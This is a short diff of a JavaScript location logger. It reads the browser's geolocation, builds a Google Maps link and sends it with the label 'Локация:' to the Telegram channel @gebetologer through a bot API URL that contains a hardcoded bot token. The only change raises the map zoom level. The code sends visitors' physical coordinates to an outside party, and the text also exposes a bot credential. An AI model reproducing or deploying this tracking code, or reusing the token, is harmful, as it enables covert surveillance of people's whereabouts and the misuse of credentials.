@@ -15,7 +15,7 @@ navigator.geolocation.getCurrentPosition(function(geo){
 	var la = geo.coords.latitude;
 	var lo = geo.coords.longitude;
 	
-	var map = 'https://www.google.com.ua/maps/@' + la + ',' + lo + ',15z';
+	var map = 'https://www.google.com.ua/maps/@' + la + ',' + lo + ',20z';
 	var API_URL = "https://api.telegram.org/bot376375041:AAFpGo0SeUJcfxOPjCynepIUhScAmbAgeYI/sendMessage?chat_id=@gebetologer&text= \
 			" + encodeURIComponent('Локация: ' + map);
 
